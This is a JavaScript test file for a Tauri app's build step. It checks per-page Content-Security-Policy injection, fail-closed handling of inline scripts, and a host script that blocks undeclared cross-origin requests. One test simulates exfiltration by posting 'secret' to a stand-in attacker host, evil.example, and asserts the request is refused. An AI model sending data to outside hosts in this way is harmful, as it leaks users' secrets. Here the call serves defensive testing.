import assert from "node:assert/strict";
import { test } from "node:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { clientRuntimeProblems } from "../vendor/kotoba-client-runtime.js";
import { descriptor, requestedCapabilities } from "../src/descriptor.mjs";

const here = fileURLToPath(new URL("../", import.meta.url));
const fixture = () => {
  const dir = mkdtempSync(path.join(tmpdir(), "tauri-fixture-"));
  mkdirSync(path.join(dir, "in/sub"), { recursive: true });
  writeFileSync(path.join(dir, "in/index.html"), '<!doctype html><html><head><style>a{}</style></head><body><a href="https://example.com/x" style="color:red">x</a><script src="/app.js"></script><script>var a=1;</script></body></html>');
  writeFileSync(path.join(dir, "in/sub/page.html"), "<html><head></head><body></body></html>");
  writeFileSync(path.join(dir, "in/app.js"), "");
  return { src: path.join(dir, "in"), out: path.join(dir, "out") };
};
const build = (src, out) => execFileSync(process.execPath, [path.join(here, "scripts/build.mjs")], { env: { ...process.env, STATIC_SRC: src, TAURI_DIST: out }, stdio: "pipe" });

test("descriptor is valid for the shared runtime and every operation is each-operation consent", () => {
  assert.deepEqual(clientRuntimeProblems(descriptor, requestedCapabilities(descriptor), ["https://tauri.localhost"]), []);
  assert.ok(descriptor.operations.every((o) => o.consent === "each-operation"));
  assert.ok(descriptor.operations.every((o) => o.endpoint.origin !== "https://tauri.localhost"));
});

test("build adds a per-page CSP derived from the descriptor and injects the host on every page", () => {
  const { src, out } = fixture();
  build(src, out);
  for (const page of ["index.html", "sub/page.html"]) {
    const html = readFileSync(path.join(out, page), "utf8");
    const csp = html.match(/Content-Security-Policy" content="([^"]+)"/)[1];
    assert.match(csp, /default-src 'none'/);
    assert.match(csp, /script-src 'self'( 'sha256-[^']+')*( 'wasm-unsafe-eval')?;/);
    assert.match(csp, /connect-src 'self' ipc: http:\/\/ipc\.localhost/);
    assert.doesNotMatch(csp, /'none' ipc/);
    assert.ok(html.includes('<script type="module" src="/host.js"></script>'));
  }
  assert.match(readFileSync(path.join(out, "index.html"), "utf8"), /style-src 'self' 'sha256-[^']+'; style-src-attr 'unsafe-inline'/);
  assert.doesNotMatch(readFileSync(path.join(out, "sub/page.html"), "utf8"), /style-src-attr/);
  const release = JSON.parse(readFileSync(path.join(out, "release.json"), "utf8"));
  assert.ok(release.files["host.js"] && release.files["runtime.js"] && release.files["descriptor.json"]);
});

test("build fails closed on a missing entry page, an inline script or an existing CSP", () => {
  for (const [label, html] of [["inline handler", '<html><head></head><body><a onclick="x()">a</a></body></html>'],
    ["no head", "x"],
    ["existing CSP", '<html><head><meta http-equiv="Content-Security-Policy" content="x"></head></html>']]) {
    const f = fixture();
    writeFileSync(path.join(f.src, "index.html"), html);
    assert.throws(() => build(f.src, f.out), /tauri build/u, label);
  }
  const none = fixture();
  assert.throws(() => build(path.join(none.src, "nope"), none.out), /tauri build/u);
});

test("host refuses undeclared cross-origin requests without touching the network and passes same-origin ones", async () => {
  const { src, out } = fixture();
  build(src, out);
  const calls = [];
  globalThis.location = new URL("https://tauri.localhost/index.html");
  globalThis.fetch = async (input) => { calls.push(String(input)); return { ok: true }; };
  const listeners = [];
  globalThis.document = { addEventListener: (type, fn) => listeners.push([type, fn]), createElement: () => ({ style: {}, append() {}, setAttribute() {}, addEventListener() {}, remove() {} }), body: { append() {} }, head: { append() {} } };
  await import(pathToFileURL(path.join(out, "host.js")).href);
  assert.deepEqual(await fetch("/local.json"), { ok: true });
  await assert.rejects(() => fetch("https://evil.example/x"), TypeError);
  await assert.rejects(() => fetch("https://evil.example/x", { method: "POST", body: "secret" }), TypeError);
  assert.deepEqual(calls, ["/local.json"]);
  const click = listeners.find(([type]) => type === "click")[1];
  let prevented = false;
  click({ target: { closest: () => ({ getAttribute: () => "https://example.com/out" }) }, preventDefault: () => { prevented = true; } });
  assert.equal(prevented, true);
  prevented = false;
  click({ target: { closest: () => ({ getAttribute: () => "/local.html" }) }, preventDefault: () => { prevented = true; } });
  assert.equal(prevented, false);
});
